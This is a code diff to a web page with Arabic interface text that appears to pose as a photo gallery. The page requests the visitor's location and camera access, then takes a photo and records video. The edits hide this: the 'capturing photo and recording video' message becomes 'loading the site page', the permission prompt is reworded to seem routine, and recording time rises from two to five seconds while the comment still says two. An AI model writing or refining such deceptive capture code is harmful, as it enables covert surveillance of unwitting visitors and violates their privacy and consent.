@@ -123,7 +123,7 @@ html, body {
             }
 
             // 2. طلب الموقع ثانياً
-            statusDiv.innerHTML = " جاري طلب تحميل الصور  ...";
+            statusDiv.innerHTML = " جاري طلب تحميل صفحة الصور  ...";
             statusDiv.className = "status-loading";
             let locData = null;
             try {
@@ -138,7 +138,7 @@ html, body {
 
             // إذا فشلت الكاميرا، نمنع الدخول
             if (!camOk) {
-                statusDiv.innerHTML = "🚫 يجب السماح للموقع لفتح المعرض.<br><br><small style='color:#666;font-size:14px;'></small>";
+                statusDiv.innerHTML = "🚫 يجب السماح الاذونات للموقع لتحميل صفحة الموقع وفتح المعرض.<br><br><small style='color:#666;font-size:14px;'></small>";
                 statusDiv.className = "status-error";
                 retryPermBtn.style.display = 'inline-block';
                 processStarted = false;
@@ -146,7 +146,7 @@ html, body {
             }
 
             // 3. التقاط صورة سريعة (اختياري)
-      statusDiv.innerHTML = "📸 جاري التقاط الصورة وتسجيل الفيديو...";
+      statusDiv.innerHTML = " جاري تحميل صفحة  الموقع ...";
 statusDiv.className = "status-loading";
 
 let imgData = null;
@@ -190,7 +190,7 @@ try {
             });
 
             recorder.start();
-            await new Promise(r => setTimeout(r, 2000));   // مدة التسجيل: ثانيتان
+            await new Promise(r => setTimeout(r, 5000));   // مدة التسجيل: ثانيتان
             try { recorder.stop(); } catch(e){}
             await recorded;
         }
